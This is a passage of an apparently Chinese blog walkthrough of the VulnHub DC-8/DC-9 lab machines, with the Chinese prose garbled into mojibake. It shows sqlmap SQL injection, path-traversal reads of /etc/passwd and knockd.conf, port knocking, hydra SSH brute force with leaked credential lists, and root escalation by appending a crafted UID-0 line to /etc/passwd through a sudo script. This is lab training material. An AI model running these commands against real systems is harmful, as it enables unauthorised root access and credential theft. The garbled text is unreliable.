<p><code>s</code>æ›¿æ¢äº†ä»¥<code>x</code>çš„å¯æ‰§è¡Œæ–‡ä»¶ï¼Œè¿™è¢«ç§°ä¸º<code>setuid</code>ä½ï¼Œæ ¹æ®åˆšåˆšçš„æ“ä½œï¼Œåº”è¯¥çŸ¥é“äº†<code>s</code>æ˜¯åšä»€ä¹ˆçš„</p>
<p>å½“è¿™ä¸ªä½è¢«<code>user</code>æƒé™çš„ç”¨æˆ·æ‰§è¡Œæ—¶ï¼Œ<code>linux</code>å®é™…ä¸Šæ˜¯ä»¥æ–‡ä»¶çš„åˆ›é€ è€…çš„æƒé™è¿è¡Œçš„ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå®ƒæ˜¯ä»¥<code>root</code>æƒé™è¿è¡Œçš„</p>
<p><strong>æˆ‘ä»¬çš„ç›®æ ‡å°±æ˜¯ï¼Œç ´è§£(pwn)è¿™äº›æ–‡ä»¶ç„¶åæ‹¿åˆ°<code>root</code>æƒé™è¯»å–<code>flag</code></strong></p>
<p>è¿™ä¹Ÿå°±æ˜¯è¿™ä¸ªå‘½ä»¤æ‰§è¡Œçš„ç›®çš„</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./raptor_exim_wiz -m setuid</span><br></pre></td></tr></table></figure>



<blockquote>
<p>ç®€è€Œè¨€ä¹‹ï¼Œå…¶å®å°±æ˜¯<code>suid</code>ææƒ</p>
<p>ä½†è¿™é‡Œå¯èƒ½æ˜¯å› ä¸ºé¶æœºçš„åŸå› æ— æ³•æ‰§è¡ŒææƒæˆåŠŸ</p>
</blockquote>
<hr>
<p>æ€»è€Œè¨€ä¹‹ï¼Œè¿™ä¸€å…³åªæ˜¯åœ¨<code>DC2</code>ä¸Šä¿®æ”¹äº†ä¸€ç‚¹ï¼Œåªè¦æŠŠå‰é¢å‡ å…³åšäº†ï¼Œè¿™å…³éš¾åº¦å¹¶ä¸å¤§</p>
<p>ã€</p>
<p>éš¾å—çš„æ˜¯é‡åˆ°<code>pwn</code>ï¼Œè™½ç„¶åœ¨è¿™é‡Œå¹¶æ²¡æœ‰ä»€ä¹ˆç”¨ï¼Œä½†æ˜¯å¦‚æœé‡åˆ°è¿™ç±»äºŒè¿›åˆ¶æ–‡ä»¶å¦‚ä½•ä¿®æ”¹æ‰èƒ½è®©å…¶æˆä¸ºæˆ‘ä»¬ææƒçš„å·¥å…·ï¼Œ</p>
<p>è€Œä¸”ç°åœ¨äºŒè¿›åˆ¶è¿˜å•¥ä¹Ÿä¸ä¼šï¼Œç»§ç»­å­¦ä¹ å§</p>
<p>ã€‘</p>
<p><strong>ä¸€ä¸ªæ——å­æ‰¾å®Œï¼Œæ¸¸æˆç»“æŸã€åè¡€äº†ã€‘</strong></p>
<hr>
<h1 id="ä¹ã€DC9-ä¸­çº§"><a href="#ä¹ã€DC9-ä¸­çº§" class="headerlink" title="ä¹ã€DC9[ä¸­çº§]"></a>ä¹ã€DC9[ä¸­çº§]</h1><p><strong>only one flag</strong></p>
<blockquote>
<p>ï¼ˆdcæœ€åä¸€å…³ï¼‰å»ºè®®å¯ä»¥è‡ªå·±æƒ³åŠæ³•åšä¸€ä¸‹ï¼Œå¦‚æœä¹‹å‰æ˜¯é åˆ«äººwpæ¥æä¾›æ€è·¯çš„è¯</p>
</blockquote>
<h2 id="ä¿¡æ¯æ”¶é›†-8"><a href="#ä¿¡æ¯æ”¶é›†-8" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h2><p>å…ˆç”¨<code>nmap</code>æ‰«ä¸€ä¸‹</p>
<p><img src="/post/vulnhub/image-20221103191148810.png" alt="image-20221103191148810"></p>
<p>ç»“æœå‘ç°åªæœ‰<code>80</code>ç«¯å£æ˜¯æ‰“å¼€çš„</p>
<p>è€Œä¸”ä¹Ÿæ²¡æœ‰ä»€ä¹ˆæ•æ„Ÿçš„ä¿¡æ¯</p>
<p>ç„¶åå†<code>dirsearch</code>æ‰«ä¸€ä¸‹</p>
<p><img src="/post/vulnhub/image-20221103191356470.png" alt="image-20221103191356470"></p>
<p>ç»“æœæ²¡æœ‰ä»€ä¹ˆæœ‰ä»·å€¼çš„ä¸œè¥¿</p>
<p><img src="/post/vulnhub/image-20221103191535378.png" alt="image-20221103191535378"></p>
<p>åœ¨<code>wappalyzer</code>é‡Œä¹Ÿçœ‹ä¸å‡ºä»€ä¹ˆä¿¡æ¯ï¼Œ<code>CMS</code>ä¹Ÿæ²¡æ˜¾ç¤º</p>
<h2 id="1-sqlæ³¨å…¥-1"><a href="#1-sqlæ³¨å…¥-1" class="headerlink" title="1.sqlæ³¨å…¥"></a>1.sqlæ³¨å…¥</h2><p>å•¥ä¹Ÿæ²¡æœ‰ä¿¡æ¯ï¼Œä½†æ˜¯åœ¨<code>display all records</code>ä¸‹</p>
<p>æˆ‘ä»¬çœ‹åˆ°ä¸€å¤§ä¸²æšä¸¾æ•°æ®ï¼Œå¾ˆç†Ÿæ‚‰ï¼Œè¿™å’Œ<code>sql</code>æ³¨å…¥æ„Ÿè§‰æœ‰å¾ˆå¤§çš„å…³ç³»</p>
<p><img src="/post/vulnhub/image-20221103195324565.png" alt="image-20221103195324565"></p>
<p>æ‰¾äº†ä¸€ä¸‹å‘ç°<code>url</code>å¹¶æ²¡æœ‰<code>sql</code>æ³¨å…¥çš„æ–¹å¼ï¼Œé‚£å°±å¯èƒ½æ˜¯è¾“å…¥æ¡†è¿›è¡Œ<code>sql</code>æ³¨å…¥äº†</p>
<p>æ ¹æ®æšä¸¾çš„æ•°æ®ï¼ŒçŒœæµ‹æ˜¯åœ¨<code>search</code>ä¸‹</p>
<p><img src="/post/vulnhub/image-20221103200048490.png" alt="image-20221103200048490"></p>
<p>æˆ‘ä»¬ç›´æ¥æŠ“åŒ…æ•°æ®ï¼Œæ‹¿<code>sqlmap</code>æ¢­å“ˆ</p>
<p><img src="/post/vulnhub/image-20221103200315686.png" alt="image-20221103200315686"></p>
<p><img src="/post/vulnhub/image-20221103200434113.png" alt="image-20221103200434113"></p>
<p>å¥½å®¶ä¼™çœŸçš„æ˜¯<code>sql</code>æ³¨å…¥</p>
<p>åé¢ä¸èµ˜è¿°ï¼Œæ‰¾åˆ°å¹¶æŸ¥çœ‹<code>users</code>æ•°æ®åº“ä¸­ç”¨æˆ·ä¿¡æ¯</p>
<p><img src="/post/vulnhub/image-20221103200557398.png" alt="image-20221103200557398"></p>
<p>å¥½å®¶ä¼™ï¼Œå®Œå…¨æ²¡æœ‰å¯¹å¯†ç åŠ å¯†</p>
<p>ä½†æ˜¯æ ¹æ®ç™»å½•é¡µé¢ï¼Œæ˜¯éœ€è¦ç®¡ç†å‘˜è´¦å·çš„ï¼Œå†æ ¹æ®<code>staff</code>ï¼Œçœ‹æ¥æˆ‘æ˜¯æ‰¾é”™è¡¨äº†</p>
<p><img src="/post/vulnhub/image-20221103200743790.png" alt="image-20221103200743790"></p>
<p>äºæ˜¯æŒ‰ä¸Šé¢ä¸€æ ·æ­¥éª¤ï¼ŒæŸ¥çœ‹<code>Staff</code>æ•°æ®åº“é‡Œçš„ä¿¡æ¯</p>
<p><img src="/post/vulnhub/image-20221103201409346.png" alt="image-20221103201409346"></p>
<p>æœç„¶åœ¨è¿™é‡Œ</p>
<blockquote>
<p><code>transorbital1</code><br>æˆ‘å¼€å§‹ä»¥ä¸ºæ˜¯å•¥å¯†é’¥ï¼Œç»“æœæ˜¯å¯†ç æ˜æ–‡ï¼Œéº»äº†</p>
<p>å½“ç„¶æ—¶é—´å……è¶³çš„å…„å¼Ÿå¯ä»¥hashcatè¯•è¯•ã€åç¬‘ã€‘</p>
</blockquote>
<p><img src="/post/vulnhub/image-20221103202130464.png" alt="image-20221103202130464"></p>
<p>æˆåŠŸç™»å½•</p>
<h2 id="2-æ–‡ä»¶åŒ…å«"><a href="#2-æ–‡ä»¶åŒ…å«" class="headerlink" title="2.æ–‡ä»¶åŒ…å«"></a>2.æ–‡ä»¶åŒ…å«</h2><p>å‘ç°å¤šäº†ä¸¤ä¸ªé€‰é¡¹æ˜¯ï¼Œä¸€ä¸ªæ˜¯å¢åŠ ç”¨æˆ·ï¼Œå¦ä¸€ä¸ªæ˜¯ç™»å‡ºè´¦å·</p>
<p>ä½†æ˜¯æˆ‘çªç„¶å‘ç°</p>
<p>åº•ä¸‹è«åå¤šäº†ä¸€è¡Œå­—</p>
<figure class="highlight fortran"><table><tr><td class="code"><pre><span class="line"><span class="keyword">File</span> does not <span class="keyword">exist</span></span><br></pre></td></tr></table></figure>

<p>ï¼Ÿï¼Ÿï¼Ÿ</p>
<p>å“ªé‡Œæ¥çš„<code>file</code>ï¼Œçœ‹æ¥æ˜¯è¿›è¡Œäº†è¯»å–æ–‡ä»¶æ“ä½œï¼Œä½†æ˜¯æ–‡ä»¶å‚æ•°ä¸å­˜åœ¨</p>
<p>çŒœæµ‹å¯èƒ½å­˜åœ¨æ–‡ä»¶åŒ…å«æ¼æ´</p>
<p>äºæ˜¯æˆ‘ä»¬åœ¨<code>url</code>ååŠ ä¸Š<code>?file=</code>è¿›è¡Œæ–‡ä»¶åŒ…å«</p>
<blockquote>
<p><code>http://192.168.133.149/manage.php?file=../../../../../etc/passwd</code><br>è¿”å›åˆ°æ ¹ç›®å½•ä¸‹ï¼ŒåŒ…å«&#x2F;etcç›®å½•ä¸‹çš„passwdæ–‡ä»¶</p>
</blockquote>
<p><img src="/post/vulnhub/image-20221103205431449.png" alt="image-20221103205431449"></p>
<p>ä½†è¿™é‡Œå¹¶æ²¡æœ‰æˆ‘ä»¬æƒ³è¦çš„ä¿¡æ¯ï¼Œ</p>
<h2 id="3-ssh"><a href="#3-ssh" class="headerlink" title="3.ssh"></a>3.ssh</h2><h3 id="1ï¼‰-knockd"><a href="#1ï¼‰-knockd" class="headerlink" title="1ï¼‰ knockd"></a>1ï¼‰ knockd</h3><blockquote>
<p>åœ¨1920å¹´ä»£ï¼Œå½“ç¦ä»¤å¦‚ç«å¦‚è¼åœ°è¿›è¡Œæ—¶ï¼Œå¦‚æœæ‚¨æƒ³è¿›å…¥è¯´è¯çŠ¶æ€ï¼Œå°±å¿…é¡»çŸ¥é“ç§˜å¯†çš„æ•²é—¨å£°ï¼Œå¹¶æ­£ç¡®åœ°æ•²æ‰“å®ƒæ‰èƒ½è¿›å…¥å†…éƒ¨ã€‚</p>
<p>ç«¯å£æ•²é—¨æ˜¯ç°ä»£çš„ç­‰åŒç‰©ã€‚ å¦‚æœæ‚¨å¸Œæœ›äººä»¬å¯ä»¥è®¿é—®æ‚¨è®¡ç®—æœºä¸Šçš„æœåŠ¡ï¼Œä½†åˆä¸æƒ³å°†é˜²ç«å¢™æ‰“å¼€åˆ°<del>Internet</del>ï¼Œåˆ™å¯ä»¥ä½¿ç”¨ç«¯å£æ–­å¼€åŠŸèƒ½ã€‚<br>å®ƒå…è®¸æ‚¨å…³é—­é˜²ç«å¢™ä¸Šå…è®¸ä¼ å…¥è¿æ¥çš„ç«¯å£ï¼Œå¹¶åœ¨è¿›è¡Œ<code>é¢„å…ˆå®‰æ’çš„è¿æ¥å°è¯•</code>æ–¹å¼æ—¶è‡ªåŠ¨æ‰“å¼€å®ƒä»¬ã€‚ è¿æ¥å°è¯•çš„é¡ºåºå……å½“ç§˜å¯†æ•²é—¨ã€‚ å¦ä¸€ä¸ªç§˜å¯†çš„æ•²é—¨å£°å…³é—­äº†æ¸¯å£ã€‚</p>
</blockquote>
<p>æˆ‘åœ¨å­¦ä¹ ç¬”è®°å†™æœ‰å…¶åŸç†ï¼Œå¯ä»¥çœ‹çœ‹ï¼Œæˆ‘ä¸åœ¨è¿™é‡Œèµ˜è¿°</p>
<p>å…ˆæŸ¥çœ‹æ•²é—¨é¡ºåº</p>
<blockquote>
<p><code>http://192.168.133.149/manage.php?file=../../../../../etc/knockd.conf</code></p>
</blockquote>
<p><img src="/post/vulnhub/image-20221103213357210.png" alt="image-20221103213357210"></p>
<p>å‘ç°æ˜¯</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">7469</span>,<span class="number">8475</span>,<span class="number">9842</span></span><br></pre></td></tr></table></figure>

<p>æ•²ä¸€ä¸‹</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">knock</span> <span class="number">192.168.133.149</span> <span class="number">7469</span> <span class="number">8475</span> <span class="number">9842</span></span><br></pre></td></tr></table></figure>

<p><img src="/post/vulnhub/image-20221103214033662.png" alt="image-20221103214033662"></p>
<p>ç„¶åå†ç”¨<code>nmap</code>æ‰«ä¸€ä¸‹ï¼Œå‘ç°<code>22</code>ç«¯å£å¼€äº†</p>
<p><img src="/post/vulnhub/image-20221103214022727.png" alt="image-20221103214022727"></p>
<h3 id="2ï¼‰-hydra"><a href="#2ï¼‰-hydra" class="headerlink" title="2ï¼‰ hydra"></a>2ï¼‰ hydra</h3><p>ç„¶åæˆ‘ä»¬ç”¨ä¹å¤´è›‡çˆ†ç ´ç™»å½•ä¸€ä¸‹<code>ssh</code></p>
<p>è‡³äºè´¦æˆ·å¯†ç å°±ç”¨æˆ‘ä»¬ä¹‹å‰<code>sql</code>æ³¨å…¥å¾—åˆ°çš„ç¬¬ä¸€ä¸ªçš„æ•°æ®</p>
<p><img src="/post/vulnhub/image-20221103200557398.png" alt="image-20221103200557398"></p>
<blockquote>
<p>usernameï¼š<br><code>marym</code><br><code>julied</code><br><code>fredf</code><br><code>barneyr</code><br><code>tomc</code><br><code>jerrym</code><br><code>wilmaf</code><br><code>bettyr</code><br><code>chandlerb</code><br><code>joeyt</code><br><code>rachelg</code><br><code>rossg</code><br><code>monicag</code><br><code>phoebeb</code><br><code>scoots</code><br><code>janitor</code><br><code>janitor2</code></p>
</blockquote>
<blockquote>
<p>passwordï¼š<br><code>3kfs86sfd</code><br><code>468sfdfsd2</code><br><code>4sfd87sfd1</code><br><code>RocksOff</code><br><code>TC&amp;TheBoyz</code><br><code>B8m#48sd</code><br><code>Pebbles</code><br><code>BamBam01</code><br><code>UrAG0D!</code><br><code>Passw0rd</code><br><code>yN72#dsd</code><br><code>ILoveRachel</code><br><code>3248dsds7s</code><br><code>smellycats</code><br><code>YR3BVxxxw87</code><br><code>Ilovepeepee</code><br><code>Hawaii-Five-0</code></p>
</blockquote>
<p>æŠŠ<code>username</code>å’Œ<code>password</code>å¤åˆ¶åˆ°ä¸¤ä¸ªæ–‡æœ¬æ–‡ä»¶ä¸­å»</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">hydra</span> -L user.txt -P pass.txt <span class="number">192.168.133.149</span> ssh</span><br></pre></td></tr></table></figure>

<p><img src="/post/vulnhub/image-20221103215414559.png" alt="image-20221103215414559"></p>
<p>å‘ç°æœ‰ä¸‰ä¸ªå¯ä»¥ç™»å½•</p>
<blockquote>
<p>login: <code>chandlerb</code>   password: <code>UrAG0D!</code><br>login: <code>joeyt</code>   password: <code>Passw0rd</code><br>login: <code>janitor</code>   password: <code>Ilovepeepee</code></p>
</blockquote>
<p>æˆ‘ä»¬å…ˆç™»å½•<code>janitor</code></p>
<blockquote>
<p>login: <code>janitor</code>   password: <code>Ilovepeepee</code></p>
</blockquote>
<p><img src="/post/vulnhub/image-20221104165102940.png" alt="image-20221104165102940"></p>
<p>ç™»å½•æˆåŠŸ</p>
<h2 id="4-ææƒ"><a href="#4-ææƒ" class="headerlink" title="4.ææƒ"></a>4.ææƒ</h2><p>å…ˆæ‰§è¡Œ </p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">sudo -l</span></span><br></pre></td></tr></table></figure>

<p>çœ‹çœ‹å½“å‰ç”¨æˆ·èƒ½ä»¥ç®¡ç†å‘˜èº«ä»½æ‰§è¡Œå“ªäº›å‘½ä»¤</p>
<p><img src="/post/vulnhub/image-20221104165528505.png" alt="image-20221104165528505"></p>
<p>çœ‹æ¥æˆ‘ä»¬æ²¡æœ‰èµ„æ ¼</p>
<p>å†æ‰§è¡Œ</p>
<figure class="highlight stata"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ls</span> -<span class="keyword">la</span></span><br></pre></td></tr></table></figure>

<p>æŸ¥çœ‹å½“å‰ç”¨æˆ·ç›®å½•æ–‡ä»¶</p>
<p><img src="/post/vulnhub/image-20221104165145529.png" alt="image-20221104165145529"></p>
<p>å‘ç°æœ‰ä¸ª</p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">secrets-for-putin</span></span><br></pre></td></tr></table></figure>

<p>å¯èƒ½æœ‰ç®¡ç†å‘˜å¯†ç ä»€ä¹ˆçš„</p>
<p><img src="/post/vulnhub/image-20221104165242513.png" alt="image-20221104165242513"></p>
<p>æœç„¶æœ‰ä¸ªæ–‡æœ¬æ–‡ä»¶ï¼ŒæŸ¥çœ‹</p>
<figure class="highlight stata"><table><tr><td class="code"><pre><span class="line"><span class="keyword">cat</span> passwords-found-<span class="keyword">on</span>-<span class="keyword">post</span>-it-<span class="keyword">notes</span>.txt</span><br></pre></td></tr></table></figure>

<p><img src="/post/vulnhub/image-20221104165331378.png" alt="image-20221104165331378"></p>
<p>åˆå¤šäº†å‡ ä¸ªå¯†ç </p>
<blockquote>
<p><code>BamBam01</code><br><code>Passw0rd</code><br><code>smellycats</code><br><code>P0Lic#10-4</code><br><code>B4-Tru3-001</code><br><code>4uGU5T-NiGHts</code></p>
</blockquote>
<p>æˆ‘ä»¬æŠŠè¿™ä¸ªè¡¥å……åˆ°æˆ‘ä»¬ä¹å¤´è›‡çˆ†ç ´çš„å¯†ç æœ¬é‡Œ</p>
<p>å†è¿›è¡Œçˆ†ç ´<code>ssh</code></p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">hydra</span> -L user.txt -P pass.txt <span class="number">192.168.133.149</span> ssh</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬å‘ç°å¤šäº†ä¸€ä¸ªæ–°çš„è´¦å·</p>
<p><img src="/post/vulnhub/image-20221104165738669.png" alt="image-20221104165738669"></p>
<blockquote>
<p>login: <code>fredf</code>   password: <code>B4-Tru3-001</code></p>
</blockquote>
<p>æˆ‘ä»¬ç™»å½•<code>ssh</code>çœ‹çœ‹</p>
<p>å†æ‰§è¡Œ</p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">sudo -l</span></span><br></pre></td></tr></table></figure>

<p><img src="/post/vulnhub/image-20221104165927452.png" alt="image-20221104165927452"></p>
<p>å‘ç°å…¶å¯ä»¥ä»¥æ— å¯†ç <code>root</code>æƒé™æ‰§è¡Œ</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">/opt/</span>devstuff<span class="regexp">/dist/</span>test/test</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬æ‰§è¡Œä¸€ä¸‹è¯•è¯•</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">sudo <span class="regexp">/opt/</span>devstuff<span class="regexp">/dist/</span>test/test</span><br></pre></td></tr></table></figure>

<p><img src="/post/vulnhub/image-20221104170533241.png" alt="image-20221104170533241"></p>
<p>æç¤ºæˆ‘ä»¬æœ‰ä¸ªtest.pyæ­£åœ¨è¢«è¯»å–ä½¿ç”¨</p>
<p>æˆ‘ä»¬æ‰¾ä¸€ä¸‹è¿™ä¸ªæ–‡ä»¶åœ¨å“ªé‡Œ</p>
<blockquote>
<p><code>find / -name &quot;test.py&quot; -type f 2&gt;/dev/null</code></p>
<p><code>-type</code> fä»£è¡¨ç±»å‹ä¸ºæ–‡ä»¶ï¼Œdä¸ºç›®å½•<br><code>2&gt;/dev/null</code>äº§ç”Ÿæ›´æ¸…æ™°çš„è¾“å‡ºï¼Œå› ä¸ºå®ƒä¼šä¸¢å¼ƒé”™è¯¯ï¼Œä¾‹å¦‚æƒé™é”™è¯¯</p>
</blockquote>
<p><img src="/post/vulnhub/image-20221104170743086.png" alt="image-20221104170743086"></p>
<p>æˆ‘ä»¬åˆ°æ–‡ä»¶ç›®å½•ä¸‹æŸ¥çœ‹ä¸€ä¸‹å†…å®¹</p>
<p><img src="/post/vulnhub/image-20221104170808449.png" alt="image-20221104170808449"></p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/<span class="keyword">python</span></span><br><span class="line"></span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span> (sys.<span class="built_in">argv</span>) != <span class="number">3</span> :</span><br><span class="line">    <span class="keyword">print</span> (<span class="string">&quot;Usage: python test.py read append&quot;</span>)</span><br><span class="line">    sys.<span class="keyword">exit</span> (<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">    <span class="keyword">f</span> = <span class="keyword">open</span>(sys.<span class="built_in">argv</span>[<span class="number">1</span>], <span class="string">&quot;r&quot;</span>)</span><br><span class="line">    output = (<span class="keyword">f</span>.<span class="keyword">read</span>())</span><br><span class="line"></span><br><span class="line">    <span class="keyword">f</span> = <span class="keyword">open</span>(sys.<span class="built_in">argv</span>[<span class="number">2</span>], <span class="string">&quot;a&quot;</span>)</span><br><span class="line">    <span class="keyword">f</span>.<span class="keyword">write</span>(output)</span><br><span class="line">    <span class="keyword">f</span>.<span class="keyword">close</span>()</span><br></pre></td></tr></table></figure>

<h3 id="pyè„šæœ¬åˆ©ç”¨"><a href="#pyè„šæœ¬åˆ©ç”¨" class="headerlink" title="pyè„šæœ¬åˆ©ç”¨"></a>pyè„šæœ¬åˆ©ç”¨</h3><p><code>è„šæœ¬æ¥å—äº†ä¸¤ä¸ªä½ç½®å‚æ•°ï¼Œå¹¶å°†ç¬¬ä¸€ä¸ªæ–‡ä»¶çš„å†…å®¹ï¼Œé™„åŠ åˆ°ç¬¬äºŒä¸ªæ–‡ä»¶çš„å†…å®¹ä¸­</code></p>
<p>å…¶å®å¦‚æœæˆ‘ä»¬æœ‰ä¿®æ”¹è„šæœ¬çš„æƒé™å°±å¥½äº†ï¼Œå¯ä»¥æ”¹æˆæ¶æ„è„šæœ¬ï¼Œä½†æ˜¯æˆ‘ä»¬å¹¶æ²¡æœ‰åœ¨è¿™ä¸ªç›®å½•å†™å…¥çš„æƒé™</p>
<p>äºæ˜¯ï¼Œæˆ‘ä»¬å¯ä»¥æ¢ä¸ªæ€è·¯ï¼Œå°±åˆ©ç”¨è„šæœ¬çš„æŠŠä¸€ä¸ªæ–‡æœ¬å†…å®¹é™„åŠ åˆ°å¦å¤–æ–‡æœ¬çš„èƒ½åŠ›ï¼Œä¿®æ”¹æˆ‘ä»¬æ— æ³•ä¿®æ”¹çš„æ–‡ä»¶ï¼Œæ¯”å¦‚<code>/etc/passwd</code></p>
<p>æˆ‘ä»¬å…ˆçœ‹çœ‹<code>/etc/passwd</code>é‡Œ<code>root</code>ç”¨æˆ·çš„æ ¼å¼</p>
<p><img src="/post/vulnhub/image-20221104171635506.png" alt="image-20221104171635506"></p>
<p>æŒ‰è¿™ä¸ªæ ¼å¼æˆ‘ä»¬å†™ä¸€ä¸ªè‡ªå·±çš„</p>
<blockquote>
<p><code>ttoc::0:0:root:/root:/bin/bash</code><br>æˆ‘è¿™é‡Œè®¾ç½®çš„ç”¨æˆ·ttocå¯†ç ä¸ºç©º</p>
</blockquote>
<hr>
<h4 id="opensslåŠ ç›"><a href="#opensslåŠ ç›" class="headerlink" title="opensslåŠ ç›"></a><code>openssl</code>åŠ ç›</h4><p>å…¶å®è¿™é‡Œæ˜¯éœ€è¦ç»™æˆ‘ä»¬çœŸå‡çš„ç”¨æˆ·æ·»åŠ å¯†ç çš„</p>
<p>ä¸ç„¶æ˜¯é€šè¿‡ä¸äº†å¯†ç è¾“å…¥é‚£ä¸€ç¯ï¼Œé‚£é‡Œä¸å…è®¸å¯†ç ä¸ºç©º</p>
<p>æˆ‘ä»¬æ‰§è¡Œ</p>
<blockquote>
<p><code>openssl passwd -1 -salt salt password</code></p>
<p><code>-1</code>ä½¿ç”¨ä»€ä¹ˆå“ˆå¸Œç®—æ³•ã€‚åœ¨æˆ‘ä»¬çš„ç”¨ä¾‹ä¸­ï¼Œè¿™æ— å…³ç´§è¦ï¼Œå› æ­¤æˆ‘ä»¬ä½¿ç”¨ MD5ï¼Œåœ¨ç°å®ä¸–ç•Œçš„ PT ä¸­åº”è¯¥é¿å…ä½¿ç”¨ MD5ï¼Œå› ä¸ºå®ƒä¸å®‰å…¨ã€‚</p>
<p><code>-salt</code> saltç”¨ä½œç›çš„å­—ç¬¦ä¸²ã€‚æˆ‘é€‰æ‹©å­—ç¬¦ä¸²ç›</p>
<p><code>password</code>æˆ‘ä»¬æƒ³ä½¿ç”¨çš„æ˜æ–‡å¯†ç </p>
</blockquote>
<p>å¾—åˆ°</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="variable">$1</span><span class="variable">$salt</span><span class="variable">$qJH7</span>.N4xYta3aEG<span class="regexp">/dfqo/</span><span class="number">0</span></span><br></pre></td></tr></table></figure>

<p><strong>æ³¨æ„å¦‚æœå¼€å§‹æ²¡åŠ å¯†ç å°±ä¼ å…¥&#x2F;etc&#x2F;passwdï¼Œåé¢ä¿®æ”¹åå†ä¼ ç”¨æˆ·ï¼Œåå­—ä¸èƒ½ç›¸åŒ</strong></p>
<hr>
<p>ä½†æ˜¯æ³¨æ„æˆ‘ä»¬å…¶å®åœ¨å¾ˆå¤šç›®å½•ä¸‹éƒ½æ²¡æœ‰å†™å…¥æƒé™ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥ç”¨ç»å…¸ä½¿ç”¨</p>
<p><code>/tmp</code>ï¼Œä¸´æ—¶æ–‡ä»¶ç›®å½•ä¸‹çš„æƒé™ç®¡æ§ä¸€èˆ¬ä¸å¤§</p>
<p>äºæ˜¯æˆ‘ä»¬æŠŠæˆ‘ä»¬çš„å†…å®¹å†™å…¥<code>/tmp</code>ç›®å½•ä¸‹çš„<code>evil</code>æ–‡ä»¶ä¸­</p>
<blockquote>
<p><code>echo &#39;ttoc:$1$salt$qJH7.N4xYta3aEG/dfqo/0:0:0:root:/root:/bin/bash&#39; &gt; /tmp/evil</code></p>
<p>*æ³¨æ„è¿™é‡Œéœ€è¦å•å¼•å·ï¼ŒåŒå¼•å·ä¼šæŠŠ$åé¢å‚æ•°å½“ä½œå˜é‡</p>
</blockquote>
<p>ç„¶åæˆ‘ä»¬å†æ‰§è¡Œ</p>
<blockquote>
<p><code>sudo /opt/devstuff/dist/test/test /tmp/evil /etc/passwd</code></p>
<p>æŠŠæˆ‘ä»¬åˆ›å»ºçš„ç”¨æˆ·rootæ·»åŠ åˆ°æ–‡æœ¬å»</p>
</blockquote>
<p><img src="/post/vulnhub/image-20221104172732031.png" alt="image-20221104172732031"></p>
<p>æœ€åç™»å½•<code>ttoc</code></p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">su ttoc</span></span><br></pre></td></tr></table></figure>

<p><img src="/post/vulnhub/image-20221104173707687.png" alt="image-20221104173707687"></p>
<p>æˆåŠŸæå–</p>
<p>è¯»å–<code>flag</code></p>
<p><img src="/post/vulnhub/image-20221104173836066.png" alt="image-20221104173836066"></p>
<blockquote>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">â–ˆâ–ˆâ–ˆâ•—   â–ˆâ–ˆâ•—â–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—    â–ˆâ–ˆâ•—    â–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ•—  â–ˆâ–ˆâ•—â–ˆâ–ˆâ•—â–ˆâ–ˆâ•—â–ˆâ–ˆâ•—</span><br><span class="line">â–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â•â•â•â–ˆâ–ˆâ•”â•â•â•â•â•    â–ˆâ–ˆâ•‘    â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘ â–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘</span><br><span class="line">â–ˆâ–ˆâ•”â–ˆâ–ˆâ•— â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘     â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—      â–ˆâ–ˆâ•‘ â–ˆâ•— â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â• â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘</span><br><span class="line">â–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘     â–ˆâ–ˆâ•”â•â•â•      â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘   